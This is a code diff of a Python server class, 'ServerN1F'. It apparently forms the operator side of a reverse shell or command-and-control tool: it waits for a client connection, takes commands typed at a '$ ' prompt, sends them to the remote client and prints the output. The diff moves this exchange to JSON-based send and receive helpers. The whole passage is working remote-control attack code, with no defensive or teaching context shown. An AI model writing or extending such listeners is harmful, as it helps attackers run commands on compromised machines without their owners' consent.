@@ -23,33 +23,33 @@ class ServerN1F:
         print(f"[+] Client connected  {str(addr)}")
 
 #   #####################################################################################
-#   Need to make it work ...
+#   JSON serialization ...
 
-#    def reliable_send(self, data):
-#        json_data = json.dumps(data)
-#        self.conn.send(json_data)
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.conn.sendall(bytes(json_data, encoding="utf-8"))
 
-#    def reliable_recv(self):
-#        json_data = self.conn.recv(1024)
-#        return json.loads(json_data)
+    def reliable_recv(self):
+        json_data = self.conn.recv(4096)
+        return json.loads(json_data)
 #   #####################################################################################
 
     def execute_command(self, command):
-        self.conn.send(str.encode(command))
-        resp = str(self.conn.recv(1024), "utf-8")
+        self.reliable_send(command)
+        resp = self.reliable_recv()
         return resp
-        #return self.conn.recv(1024)
 
     def run_server(self):
         while True:
             command = input("$ ")
             result = self.execute_command(command)
-            print(str(result))
+            print(result)
 
 
 if __name__ == "__main__":
     s = ServerN1F(S_IP, S_PORT)
     s.run_server()
+
 
 
 
